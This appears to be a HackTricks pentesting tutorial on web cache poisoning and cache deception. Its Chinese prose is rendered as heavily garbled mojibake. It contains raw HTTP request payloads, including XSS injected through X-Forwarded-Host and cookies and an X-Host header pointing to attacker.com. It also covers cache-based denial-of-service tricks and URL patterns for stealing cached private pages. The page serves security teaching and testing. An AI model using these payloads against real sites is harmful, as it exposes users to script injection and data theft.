# ç¼“å­˜æŠ•æ¯’å’Œç¼“å­˜æ¬ºéª—

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* ä½ åœ¨ä¸€å®¶**ç½‘ç»œå®‰å…¨å…¬å¸**å·¥ä½œå—ï¼Ÿä½ æƒ³åœ¨HackTricksä¸­çœ‹åˆ°ä½ çš„**å…¬å¸å¹¿å‘Š**å—ï¼Ÿæˆ–è€…ä½ æƒ³è·å¾—**PEASSçš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½PDFæ ¼å¼çš„HackTricks**å—ï¼Ÿè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* å‘ç°æˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)æ”¶è—å“[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* è·å–[**å®˜æ–¹PEASSå’ŒHackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* **åŠ å…¥**[**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f)æˆ–[**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass)æˆ–**å…³æ³¨**æˆ‘åœ¨**Twitter**ä¸Šçš„[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**ã€‚**
* **é€šè¿‡å‘**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **å’Œ**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **æäº¤PRæ¥åˆ†äº«ä½ çš„é»‘å®¢æŠ€å·§ã€‚**

</details>

<figure><img src="../.gitbook/assets/image (3) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
ä½¿ç”¨[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)å¯ä»¥è½»æ¾æ„å»ºå’Œ**è‡ªåŠ¨åŒ–å·¥ä½œæµç¨‹**ï¼Œä½¿ç”¨å…¨çƒ**æœ€å…ˆè¿›çš„**ç¤¾åŒºå·¥å…·ã€‚\
ç«‹å³è·å–è®¿é—®æƒé™ï¼š

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## åŒºåˆ«

> **Webç¼“å­˜æŠ•æ¯’å’ŒWebç¼“å­˜æ¬ºéª—æœ‰ä»€ä¹ˆåŒºåˆ«ï¼Ÿ**
>
> * åœ¨**Webç¼“å­˜æŠ•æ¯’**ä¸­ï¼Œæ”»å‡»è€…ä¼šå¯¼è‡´åº”ç”¨ç¨‹åºå°†ä¸€äº›æ¶æ„å†…å®¹å­˜å‚¨åœ¨ç¼“å­˜ä¸­ï¼Œå¹¶ä»ç¼“å­˜ä¸­å‘å…¶ä»–åº”ç”¨ç¨‹åºç”¨æˆ·æä¾›æ­¤å†…å®¹ã€‚
> * åœ¨**Webç¼“å­˜æ¬ºéª—**ä¸­ï¼Œæ”»å‡»è€…ä¼šå¯¼è‡´åº”ç”¨ç¨‹åºå°†å±äºå¦ä¸€ä¸ªç”¨æˆ·çš„æŸäº›æ•æ„Ÿå†…å®¹å­˜å‚¨åœ¨ç¼“å­˜ä¸­ï¼Œç„¶åæ”»å‡»è€…ä»ç¼“å­˜ä¸­æ£€ç´¢æ­¤å†…å®¹ã€‚

## ç¼“å­˜æŠ•æ¯’

æŠ•æ¯’ç¼“å­˜çš„ç›®æ ‡æ˜¯ä½¿**å®¢æˆ·ç«¯éƒ¨åˆ†åŠ è½½æ„å¤–èµ„æºæˆ–å—æ”»å‡»è€…æ§åˆ¶çš„èµ„æº**ã€‚\
æŠ•æ¯’çš„å“åº”ä»…ä¼šæä¾›ç»™åœ¨ç¼“å­˜è¢«æŠ•æ¯’æ—¶è®¿é—®å—å½±å“é¡µé¢çš„ç”¨æˆ·ã€‚å› æ­¤ï¼Œå½±å“çš„ç¨‹åº¦å–å†³äºé¡µé¢æ˜¯å¦å—æ¬¢è¿ã€‚

è¦æ‰§è¡Œç¼“å­˜æŠ•æ¯’æ”»å‡»ï¼Œé¦–å…ˆéœ€è¦**è¯†åˆ«æ— é”®è¾“å…¥**ï¼ˆä¸éœ€è¦å‡ºç°åœ¨ç¼“å­˜è¯·æ±‚ä¸­ä½†ä¼šæ”¹å˜è¿”å›é¡µé¢çš„å‚æ•°ï¼‰ï¼ŒæŸ¥çœ‹å¦‚ä½•æ»¥ç”¨æ­¤å‚æ•°å¹¶**è·å–å“åº”ç¼“å­˜**ã€‚

### å‘ç°ï¼šæ£€æŸ¥HTTPå¤´

é€šå¸¸ï¼Œå½“å“åº”è¢«**å­˜å‚¨åœ¨ç¼“å­˜ä¸­**æ—¶ï¼Œä¼šæœ‰ä¸€ä¸ª**æŒ‡ç¤ºçš„å¤´éƒ¨**ï¼Œä½ å¯ä»¥åœ¨è¿™ç¯‡æ–‡ç« ä¸­æŸ¥çœ‹åº”è¯¥æ³¨æ„çš„å¤´éƒ¨ï¼š[**HTTPç¼“å­˜å¤´éƒ¨**](../network-services-pentesting/pentesting-web/special-http-headers.md#cache-headers)ã€‚

### å‘ç°ï¼šç¼“å­˜400çŠ¶æ€ç 

å¦‚æœä½ è®¤ä¸ºå“åº”è¢«å­˜å‚¨åœ¨ç¼“å­˜ä¸­ï¼Œä½ å¯ä»¥å°è¯•**å‘é€å¸¦æœ‰é”™è¯¯å¤´éƒ¨çš„è¯·æ±‚**ï¼Œåº”è¯¥ä¼šè¿”å›**çŠ¶æ€ç 400**ã€‚ç„¶åå°è¯•æ­£å¸¸è®¿é—®è¯·æ±‚ï¼Œå¦‚æœ**å“åº”æ˜¯400çŠ¶æ€ç **ï¼Œåˆ™è¯´æ˜å­˜åœ¨æ¼æ´ï¼ˆç”šè‡³å¯ä»¥æ‰§è¡ŒDoSæ”»å‡»ï¼‰ã€‚\
ä¸€ä¸ªé…ç½®é”™è¯¯çš„å¤´éƒ¨å¯èƒ½åªæ˜¯`\:`ä½œä¸ºå¤´éƒ¨ã€‚\
è¯·æ³¨æ„ï¼Œæœ‰æ—¶è¿™äº›ç±»å‹çš„çŠ¶æ€ç ä¸ä¼šè¢«ç¼“å­˜ï¼Œå› æ­¤æ­¤æµ‹è¯•å°†æ— æ•ˆã€‚

### å‘ç°ï¼šè¯†åˆ«å’Œè¯„ä¼°æ— é”®è¾“å…¥

ä½ å¯ä»¥ä½¿ç”¨[**Param Miner**](https://portswigger.net/bappstore/17d2949a985c4b7ca092728dba871943)æ¥**æš´åŠ›ç ´è§£å¯èƒ½ä¼šæ”¹å˜é¡µé¢å“åº”çš„å‚æ•°å’Œå¤´éƒ¨**ã€‚ä¾‹å¦‚ï¼Œé¡µé¢å¯èƒ½ä½¿ç”¨å¤´éƒ¨`X-Forwarded-For`æ¥æŒ‡ç¤ºå®¢æˆ·ç«¯ä»é‚£é‡ŒåŠ è½½è„šæœ¬ï¼š
```markup
<script type="text/javascript" src="//<X-Forwarded-For_value>/resources/js/tracking.js"></script>
```
### å¼•å‘åç«¯æœåŠ¡å™¨çš„æœ‰å®³å“åº”

é€šè¿‡è¯†åˆ«å‚æ•°/æ ‡å¤´ï¼Œæ£€æŸ¥å®ƒæ˜¯å¦‚ä½•è¢«**æ¸…ç†**çš„ä»¥åŠå®ƒåœ¨å“åº”æ ‡å¤´ä¸­çš„**åå°„ä½ç½®**æˆ–å½±å“ã€‚ä½ èƒ½ä»¥ä»»ä½•æ–¹å¼æ»¥ç”¨å®ƒå—ï¼ˆæ‰§è¡ŒXSSæˆ–åŠ è½½ç”±ä½ æ§åˆ¶çš„JSä»£ç ï¼Ÿæ‰§è¡ŒDoSæ”»å‡»ï¼Ÿ...ï¼‰

### è·å–å“åº”ç¼“å­˜

ä¸€æ—¦ä½ **ç¡®å®š**äº†å¯ä»¥æ»¥ç”¨çš„**é¡µé¢**ï¼Œè¦ä½¿ç”¨çš„**å‚æ•°/æ ‡å¤´**ä»¥åŠ**å¦‚ä½•**æ»¥ç”¨å®ƒï¼Œä½ éœ€è¦è·å–é¡µé¢çš„ç¼“å­˜ã€‚æ ¹æ®ä½ å°è¯•ç¼“å­˜çš„èµ„æºï¼Œè¿™å¯èƒ½éœ€è¦ä¸€äº›æ—¶é—´ï¼Œä½ å¯èƒ½éœ€è¦å°è¯•å‡ ç§’é’Ÿã€‚\
å“åº”ä¸­çš„æ ‡å¤´**`X-Cache`**å¯èƒ½éå¸¸æœ‰ç”¨ï¼Œå› ä¸ºå½“è¯·æ±‚æœªè¢«ç¼“å­˜æ—¶ï¼Œå®ƒå¯èƒ½å…·æœ‰å€¼**`miss`**ï¼Œè€Œå½“å®ƒè¢«ç¼“å­˜æ—¶ï¼Œå®ƒå¯èƒ½å…·æœ‰å€¼**`hit`**ã€‚\
æ ‡å¤´**`Cache-Control`**ä¹Ÿå¾ˆæœ‰è¶£ï¼Œå¯ä»¥çŸ¥é“èµ„æºæ˜¯å¦è¢«ç¼“å­˜ä»¥åŠä¸‹ä¸€æ¬¡èµ„æºå°†å†æ¬¡è¢«ç¼“å­˜çš„æ—¶é—´ï¼š`Cache-Control: public, max-age=1800`\
å¦ä¸€ä¸ªæœ‰è¶£çš„æ ‡å¤´æ˜¯**`Vary`**ã€‚è¯¥æ ‡å¤´é€šå¸¸ç”¨äº**æŒ‡ç¤ºå…¶ä»–æ ‡å¤´**ï¼Œå³ä½¿å®ƒä»¬é€šå¸¸æ˜¯æ— é”®çš„ï¼Œä¹Ÿè¢«è§†ä¸º**ç¼“å­˜é”®çš„ä¸€éƒ¨åˆ†**ã€‚å› æ­¤ï¼Œå¦‚æœç”¨æˆ·çŸ¥é“å—å®³è€…çš„`User-Agent`ï¼Œä»–å¯ä»¥ä¸ºä½¿ç”¨ç‰¹å®š`User-Agent`çš„ç”¨æˆ·æ±¡æŸ“ç¼“å­˜ã€‚\
ä¸ç¼“å­˜ç›¸å…³çš„å¦ä¸€ä¸ªæ ‡å¤´æ˜¯**`Age`**ã€‚å®ƒå®šä¹‰äº†å¯¹è±¡åœ¨ä»£ç†ç¼“å­˜ä¸­å­˜åœ¨çš„æ—¶é—´ï¼ˆä»¥ç§’ä¸ºå•ä½ï¼‰ã€‚

åœ¨ç¼“å­˜è¯·æ±‚æ—¶ï¼Œè¦**å°å¿ƒä½¿ç”¨æ ‡å¤´**ï¼Œå› ä¸ºå…¶ä¸­ä¸€äº›æ ‡å¤´å¯èƒ½ä¼šè¢«æ„å¤–åœ°ç”¨ä½œ**æœ‰é”®çš„**ï¼Œè€Œ**å—å®³è€…éœ€è¦ä½¿ç”¨ç›¸åŒçš„æ ‡å¤´**ã€‚å§‹ç»ˆä½¿ç”¨**ä¸åŒçš„æµè§ˆå™¨**æµ‹è¯•ç¼“å­˜æŠ•æ¯’æ˜¯å¦æœ‰æ•ˆã€‚

## æ¼æ´åˆ©ç”¨ç¤ºä¾‹

### æœ€ç®€å•çš„ç¤ºä¾‹

å“åº”ä¸­æœªç»æ¸…ç†åœ°åå°„äº†ç±»ä¼¼`X-Forwarded-For`çš„æ ‡å¤´\
ä½ å¯ä»¥å‘é€ä¸€ä¸ªåŸºæœ¬çš„XSSæœ‰æ•ˆè´Ÿè½½å¹¶æ±¡æŸ“ç¼“å­˜ï¼Œè¿™æ ·è®¿é—®è¯¥é¡µé¢çš„æ¯ä¸ªäººéƒ½å°†å—åˆ°XSSæ”»å‡»ï¼š
```markup
GET /en?region=uk HTTP/1.1
Host: innocent-website.com
X-Forwarded-Host: a."><script>alert(1)</script>"
```
_è¯·æ³¨æ„ï¼Œè¿™å°†ä¼šå¯¹`/en?region=uk`çš„è¯·æ±‚è¿›è¡Œç¯¡æ”¹ï¼Œè€Œä¸æ˜¯`/en`çš„è¯·æ±‚_

### ä½¿ç”¨Webç¼“å­˜ç¯¡æ”¹æ¥åˆ©ç”¨Cookieå¤„ç†æ¼æ´

Cookieä¹Ÿå¯ä»¥åœ¨é¡µé¢çš„å“åº”ä¸­åå°„ã€‚å¦‚æœä½ èƒ½å¤Ÿæ»¥ç”¨å®ƒæ¥å¼•å‘XSSæ”»å‡»ï¼Œé‚£ä¹ˆä½ å°±å¯ä»¥åˆ©ç”¨æ¶æ„ç¼“å­˜å“åº”ä¸­çš„XSSæ”»å‡»æ¥æ”»å‡»å¤šä¸ªå®¢æˆ·ç«¯ã€‚
```markup
GET / HTTP/1.1
Host: vulnerable.com
Cookie: session=VftzO7ZtiBj5zNLRAuFpXpSQLjS4lBmU; fehost=asd"%2balert(1)%2b"
```
è¯·æ³¨æ„ï¼Œå¦‚æœæ˜“å—æ”»å‡»çš„cookieè¢«ç”¨æˆ·å¹¿æ³›ä½¿ç”¨ï¼Œå¸¸è§„è¯·æ±‚å°†æ¸…é™¤ç¼“å­˜ã€‚

### åˆ©ç”¨å¤šä¸ªå¤´éƒ¨æ¥åˆ©ç”¨Webç¼“å­˜æ±¡æŸ“æ¼æ´ <a href="#using-multiple-headers-to-exploit-web-cache-poisoning-vulnerabilities" id="using-multiple-headers-to-exploit-web-cache-poisoning-vulnerabilities"></a>

æœ‰æ—¶ï¼Œæ‚¨éœ€è¦åˆ©ç”¨å¤šä¸ªæ— é”®è¾“å…¥æ¥æ»¥ç”¨ç¼“å­˜ã€‚ä¾‹å¦‚ï¼Œå¦‚æœæ‚¨å°†`X-Forwarded-Host`è®¾ç½®ä¸ºæ‚¨æ§åˆ¶çš„åŸŸï¼Œå¹¶å°†`X-Forwarded-Scheme`è®¾ç½®ä¸º`http`ï¼Œåˆ™å¯èƒ½ä¼šå‘ç°ä¸€ä¸ª**å¼€æ”¾é‡å®šå‘**ã€‚**å¦‚æœ**æœåŠ¡å™¨å°†æ‰€æœ‰**HTTP**è¯·æ±‚**è½¬å‘åˆ°HTTPS**å¹¶ä½¿ç”¨å¤´éƒ¨`X-Forwarded-Scheme`ä½œä¸ºé‡å®šå‘çš„åŸŸåï¼Œæ‚¨å¯ä»¥é€šè¿‡é‡å®šå‘æ§åˆ¶é¡µé¢æŒ‡å‘çš„ä½ç½®ã€‚
```markup
GET /resources/js/tracking.js HTTP/1.1
Host: acc11fe01f16f89c80556c2b0056002e.web-security-academy.net
X-Forwarded-Host: ac8e1f8f1fb1f8cb80586c1d01d500d3.web-security-academy.net/
X-Forwarded-Scheme: http
```
### åˆ©ç”¨æœ‰é™çš„`Vary`å¤´è¿›è¡Œæ”»å‡»

å¦‚æœä½ å‘ç°**`X-Host`**å¤´è¢«ç”¨ä½œ**åŠ è½½JSèµ„æºçš„åŸŸå**ï¼Œä½†å“åº”ä¸­çš„**`Vary`**å¤´æŒ‡ç¤ºäº†**`User-Agent`**ã€‚é‚£ä¹ˆï¼Œä½ éœ€è¦æ‰¾åˆ°ä¸€ç§æ–¹æ³•æ¥çªƒå–å—å®³è€…çš„User-Agentï¼Œå¹¶ä½¿ç”¨è¯¥User-Agentæ¥æ±¡æŸ“ç¼“å­˜ï¼š
```markup
GET / HTTP/1.1
Host: vulnerbale.net
User-Agent: THE SPECIAL USER-AGENT OF THE VICTIM
X-Host: attacker.com
```
### åˆ©ç”¨HTTPè¯·æ±‚æ¬ºéª—è¿›è¡ŒHTTPç¼“å­˜æ¬ºéª—æ”»å‡»

åœ¨è¿™é‡Œäº†è§£å¦‚ä½•é€šè¿‡æ»¥ç”¨HTTPè¯·æ±‚æ¬ºéª—æ¥æ‰§è¡Œ[ç¼“å­˜æ¬ºéª—æ”»å‡»](http-request-smuggling/#using-http-request-smuggling-to-perform-web-cache-poisoning)ã€‚

### è‡ªåŠ¨åŒ–æµ‹è¯•Webç¼“å­˜æ¬ºéª—

å¯ä»¥ä½¿ç”¨[Webç¼“å­˜æ¼æ´æ‰«æå™¨](https://github.com/Hackmanit/Web-Cache-Vulnerability-Scanner)æ¥è‡ªåŠ¨æµ‹è¯•Webç¼“å­˜æ¬ºéª—ã€‚å®ƒæ”¯æŒè®¸å¤šä¸åŒçš„æŠ€æœ¯ï¼Œå¹¶ä¸”é«˜åº¦å¯å®šåˆ¶ã€‚

ç¤ºä¾‹ç”¨æ³•ï¼š`wcvs -u example.com`

<figure><img src="../.gitbook/assets/image (3) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
ä½¿ç”¨[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)è½»æ¾æ„å»ºå’Œ**è‡ªåŠ¨åŒ–å·¥ä½œæµç¨‹**ï¼Œä½¿ç”¨å…¨çƒ**æœ€å…ˆè¿›**çš„ç¤¾åŒºå·¥å…·ã€‚\
ç«‹å³è·å–è®¿é—®æƒé™ï¼š

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## å¯æ¼æ´ç¤ºä¾‹

### Apache Traffic Server ([CVE-2021-27577](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-27577))

ATSåœ¨URLä¸­è½¬å‘äº†ç‰‡æ®µè€Œæ²¡æœ‰å‰¥ç¦»å®ƒï¼Œå¹¶ä¸”ä»…ä½¿ç”¨ä¸»æœºã€è·¯å¾„å’ŒæŸ¥è¯¢ç”Ÿæˆç¼“å­˜é”®ï¼ˆå¿½ç•¥ç‰‡æ®µï¼‰ã€‚å› æ­¤ï¼Œè¯·æ±‚`/#/../?r=javascript:alert(1)`è¢«å‘é€åˆ°åç«¯ä½œä¸º`/#/../?r=javascript:alert(1)`ï¼Œç¼“å­˜é”®ä¸­æ²¡æœ‰æœ‰æ•ˆè½½è·ï¼Œåªæœ‰ä¸»æœºã€è·¯å¾„å’ŒæŸ¥è¯¢ã€‚

### GitHub CP-DoS

åœ¨å†…å®¹ç±»å‹æ ‡å¤´ä¸­å‘é€é”™è¯¯çš„å€¼ä¼šè§¦å‘405ç¼“å­˜å“åº”ã€‚ç¼“å­˜é”®åŒ…å«äº†cookieï¼Œå› æ­¤åªèƒ½æ”»å‡»æœªç»æˆæƒçš„ç”¨æˆ·ã€‚

### GitLab + GCP CP-DoS

GitLabä½¿ç”¨GCPå­˜å‚¨é™æ€å†…å®¹ã€‚**GCPå­˜å‚¨æ¡¶**æ”¯æŒ**å¤´éƒ¨`x-http-method-override`**ã€‚å› æ­¤ï¼Œå¯ä»¥å‘é€å¤´éƒ¨`x-http-method-override: HEAD`å¹¶æ¬ºéª—ç¼“å­˜è¿”å›ç©ºå“åº”æ­£æ–‡ã€‚å®ƒè¿˜å¯ä»¥æ”¯æŒæ–¹æ³•`PURGE`ã€‚

### Rackä¸­é—´ä»¶ï¼ˆRuby on Railsï¼‰

Ruby on Railsåº”ç”¨ç¨‹åºé€šå¸¸ä¸Rackä¸­é—´ä»¶ä¸€èµ·éƒ¨ç½²ã€‚ä¸‹é¢çš„Rackä»£ç è·å–**`x-forwarded-scheme`çš„å€¼ï¼Œå¹¶å°†å…¶ç”¨ä½œè¯·æ±‚çš„æ–¹æ¡ˆ**ã€‚

![](<../.gitbook/assets/image (159) (2).png>)

å‘é€`x-forwarded-scheme: http`å¤´éƒ¨å°†å¯¼è‡´301é‡å®šå‘åˆ°ç›¸åŒçš„ä½ç½®ï¼Œä»è€Œå¯¼è‡´è¯¥èµ„æºçš„DoSï¼Œå¦‚æ­¤ç¤ºä¾‹ä¸­æ‰€ç¤ºï¼š

![](<../.gitbook/assets/image (166).png>)

åº”ç”¨ç¨‹åºè¿˜å¯ä»¥æ”¯æŒå¤´éƒ¨`X-forwarded-host`å¹¶å°†ç”¨æˆ·é‡å®šå‘åˆ°è¯¥ä¸»æœºï¼Œä»è€Œå¯ä»¥ä»æ”»å‡»è€…æœåŠ¡å™¨åŠ è½½JavaScriptæ–‡ä»¶ï¼š

![](<../.gitbook/assets/image (157) (2).png>)

### 403å’Œå­˜å‚¨æ¡¶

ä»¥å‰ï¼Œ**Cloudflare**ä¼š**ç¼“å­˜403å“åº”**ï¼Œå› æ­¤å‘é€**é”™è¯¯çš„æˆæƒ**æ ‡å¤´å°è¯•è®¿é—®**S3**æˆ–**Azureå­˜å‚¨Blob**å°†è¿”å›ä¸€ä¸ªè¢«ç¼“å­˜çš„403ã€‚Cloudflareä¸å†ç¼“å­˜403å“åº”ï¼Œä½†è¿™å¯èƒ½é€‚ç”¨äºå…¶ä»–ä»£ç†ã€‚

![](<../.gitbook/assets/image (171).png>)

### æ³¨å…¥é”®å‚æ•°

å¾ˆå¤šæ—¶å€™ï¼Œç¼“å­˜è¢«é…ç½®ä¸º**ä»…å°†ç‰¹å®šGETå‚æ•°åŒ…å«åœ¨ç¼“å­˜é”®ä¸­**ã€‚

ä¾‹å¦‚ï¼ŒFastlyä½¿ç”¨Varnishåœ¨è¯·æ±‚ä¸­**ç¼“å­˜äº†`size`å‚æ•°**ï¼Œä½†å¦‚æœæ‚¨åŒæ—¶å‘é€äº†å¸¦æœ‰é”™è¯¯å€¼çš„**`siz%65`**å‚æ•°ï¼Œ**ç¼“å­˜é”®**å°†ä½¿ç”¨**æ­£ç¡®ç¼–å†™çš„sizeå‚æ•°**æ„å»ºï¼Œä½†**åç«¯**å°†ä½¿ç”¨**URLç¼–ç å‚æ•°ä¸­çš„å€¼**ã€‚

![](<../.gitbook/assets/image (180).png>)

å¯¹ç¬¬äºŒä¸ª`size`å‚æ•°è¿›è¡ŒURLç¼–ç ä¼šå¯¼è‡´ç¼“å­˜å¿½ç•¥å®ƒï¼Œä½†åç«¯ä½¿ç”¨å®ƒã€‚ç»™å‚æ•°èµ‹å€¼ä¸º0å°†å¯¼è‡´å¯ç¼“å­˜çš„400 Bad Requestã€‚

### ç”¨æˆ·ä»£ç†è§„åˆ™

ç”±äºFFUFæˆ–Nucleiç­‰å·¥å…·ç”Ÿæˆçš„æµé‡å¾ˆå¤§ï¼Œä¸€äº›å¼€å‘äººå‘˜å†³å®šé˜»æ­¢ä¸å…¶ç”¨æˆ·ä»£ç†åŒ¹é…çš„è¯·æ±‚ã€‚å…·æœ‰è®½åˆºæ„å‘³çš„æ˜¯ï¼Œè¿™äº›è°ƒæ•´å¯èƒ½ä¼šå¼•å…¥æ„å¤–çš„ç¼“å­˜æ¬ºéª—å’ŒDoSæœºä¼šã€‚

![](<../.gitbook/assets/image (167) (2).png>)

æˆ‘å‘ç°è¿™åœ¨å¤šä¸ªç›®æ ‡ä¸Šéƒ½æœ‰æ•ˆï¼Œä½¿ç”¨äº†æ¥è‡ªä¸åŒå·¥å…·æˆ–æ‰«æå™¨çš„ç”¨æˆ·ä»£ç†ã€‚

### éæ³•çš„æ ‡å¤´å­—æ®µ

æ ‡å¤´åç§°æ ¼å¼åœ¨[RFC7230](https://datatracker.ietf.mrg/doc/html/rfc7230)ä¸­å®šä¹‰å¦‚ä¸‹ï¼š

![](<../.gitbook/assets/image (175) (2).png>)

ç†è®ºä¸Šï¼Œå¦‚æœæ ‡å¤´åç§°åŒ…å«é™¤**tchar**ä¸­åˆ—å‡ºçš„å­—ç¬¦ä»¥å¤–çš„å­—ç¬¦ï¼Œåº”è¯¥æ‹’ç»å®ƒå¹¶è¿”å›400 Bad Requestã€‚ç„¶è€Œï¼Œåœ¨å®è·µä¸­ï¼ŒæœåŠ¡å™¨å¹¶ä¸æ€»æ˜¯éµå®ˆRFCã€‚åˆ©ç”¨è¿™ä¸ªç»†å¾®å·®åˆ«çš„æœ€ç®€å•æ–¹æ³•æ˜¯é’ˆå¯¹ä¸æ‹’ç»æ— æ•ˆæ ‡å¤´çš„Akamaiè¿›è¡Œæ”»å‡»ï¼Œè€Œæ˜¯å°†å…¶è½¬å‘å¹¶ç¼“å­˜ä»»ä½•400é”™è¯¯ï¼Œåªè¦ç¼“å­˜æ§åˆ¶æ ‡å¤´ä¸å­˜åœ¨ã€‚

![](<../.gitbook/assets/image (163).png>)

å‘é€åŒ…å«éæ³•å­—ç¬¦`\`çš„æ ‡å¤´å°†å¯¼è‡´å¯ç¼“å­˜çš„400 Bad Requesté”™è¯¯ã€‚è¿™æ˜¯æˆ‘åœ¨æµ‹è¯•ä¸­æœ€å¸¸å‘ç°çš„æ¨¡å¼ä¹‹ä¸€ã€‚

### æŸ¥æ‰¾æ–°çš„æ ‡å¤´

[https://gist.github.com/iustin24/92a5ba76ee436c85716f003dda8eecc6](https://gist.github.com/iustin24/92a5ba76ee436c85716f003dda8eecc6)

## ç¼“å­˜æ¬ºéª—

ç¼“å­˜æ¬ºéª—çš„ç›®æ ‡æ˜¯ä½¿å®¢æˆ·ç«¯**åŠ è½½å°†ç”±ç¼“å­˜ä¿å­˜çš„èµ„æºåŠå…¶æ•æ„Ÿä¿¡æ¯**ã€‚

é¦–å…ˆè¦æ³¨æ„çš„æ˜¯ï¼Œé€šå¸¸ä¼šå°†`.css`ã€`.js`ã€`.png`ç­‰**æ‰©å±•å**é…ç½®ä¸º**ä¿å­˜åœ¨ç¼“å­˜ä¸­**ã€‚å› æ­¤ï¼Œå¦‚æœè®¿é—®`www.example.com/profile.php/nonexistent.js`ï¼Œç¼“å­˜å¯èƒ½ä¼šå­˜å‚¨å“åº”ï¼Œå› ä¸ºå®ƒçœ‹åˆ°äº†`.js`**æ‰©å±•å**ã€‚ä½†æ˜¯ï¼Œå¦‚æœ**åº”ç”¨ç¨‹åº**æ­£åœ¨ä½¿ç”¨å­˜å‚¨åœ¨ _www.example.com/profile.php_ ä¸­çš„**æ•æ„Ÿ**ç”¨æˆ·å†…å®¹è¿›è¡Œ**å›æ”¾**ï¼Œæ‚¨å¯ä»¥ä»å…¶ä»–ç”¨æˆ·é‚£é‡Œ**çªƒå–**è¿™äº›å†…å®¹ã€‚

å…¶ä»–è¦æµ‹è¯•çš„å†…å®¹ï¼š

* _www.example.com/profile.php/.js_
* _www.example.com/profile.php/.css_
* _www.example.com/profile.php/test.js_
* _www.example.com/profile.php/../test.js_
* _www.example.com/profile.php/%2e%2e/test.js_
* _ä½¿ç”¨è¾ƒå°‘çŸ¥åçš„æ‰©å±•åï¼Œå¦‚_ `.avif`

åœ¨è¿™ç¯‡æ–‡ç« ä¸­å¯ä»¥æ‰¾åˆ°å¦ä¸€ä¸ªéå¸¸æ˜æ˜¾çš„ä¾‹å­ï¼š[https://hackerone.com/reports/593712](https://hackerone.com/reports/593712)ã€‚\
åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œè§£é‡Šäº†å¦‚æœåŠ è½½ä¸€ä¸ªä¸å­˜åœ¨çš„é¡µé¢ï¼Œæ¯”å¦‚_http://www.example.com/home.php/non-existent.css_ï¼Œå°†è¿”å› _http://www.example.com/home.php_ çš„å†…å®¹ï¼ˆ**åŒ…å«ç”¨æˆ·çš„æ•æ„Ÿä¿¡æ¯**ï¼‰ï¼Œå¹¶ä¸”ç¼“å­˜æœåŠ¡å™¨å°†ä¿å­˜ç»“æœã€‚\
ç„¶åï¼Œ**æ”»å‡»è€…**å¯ä»¥åœ¨è‡ªå·±çš„æµè§ˆå™¨ä¸­è®¿é—® _http://www.example.com/home.php/non-existent.css_ å¹¶è§‚å¯Ÿä¹‹å‰è®¿é—®è¿‡çš„ç”¨æˆ·çš„**æœºå¯†ä¿¡æ¯**ã€‚

è¯·æ³¨æ„ï¼Œ**ç¼“å­˜ä»£ç†**åº”è¯¥æ ¹æ®æ–‡ä»¶çš„**æ‰©å±•å**ï¼ˆ_.css_ï¼‰è€Œä¸æ˜¯åŸºäºå†…å®¹ç±»å‹è¿›è¡Œ**é…ç½®**æ¥**ç¼“å­˜**æ–‡ä»¶ã€‚åœ¨ç¤ºä¾‹ä¸­ï¼Œ_http://www.example.com/home.php/non-existent.css_ çš„å†…å®¹ç±»å‹å°†æ˜¯`text/html`è€Œä¸æ˜¯`text/css`ï¼ˆè¿™æ˜¯_.css_æ–‡ä»¶çš„é¢„æœŸå†…å®¹ç±»å‹ï¼‰ã€‚

åœ¨è¿™é‡Œäº†è§£å¦‚ä½•é€šè¿‡æ»¥ç”¨HTTPè¯·æ±‚æ¬ºéª—æ¥æ‰§è¡Œ[ç¼“å­˜æ¬ºéª—æ”»å‡»](http-request-smuggling/#using-http-request-smuggling-to-perform-web-cache-deception)ã€‚
## å‚è€ƒèµ„æ–™

* [https://portswigger.net/web-security/web-cache-poisoning](https://portswigger.net/web-security/web-cache-poisoning)
* [https://portswigger.net/web-security/web-cache-poisoning/exploiting#using-web-cache-poisoning-to-exploit-cookie-handling-vulnerabilities](https://portswigger.net/web-security/web-cache-poisoning/exploiting#using-web-cache-poisoning-to-exploit-cookie-handling-vulnerabilities)
* [https://hackerone.com/reports/593712](https://hackerone.com/reports/593712)
* [https://youst.in/posts/cache-poisoning-at-scale/](https://youst.in/posts/cache-poisoning-at-scale/)
* [https://bxmbn.medium.com/how-i-test-for-web-cache-vulnerabilities-tips-and-tricks-9b138da08ff9](https://bxmbn.medium.com/how-i-test-for-web-cache-vulnerabilities-tips-and-tricks-9b138da08ff9)

<figure><img src="../.gitbook/assets/image (3) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
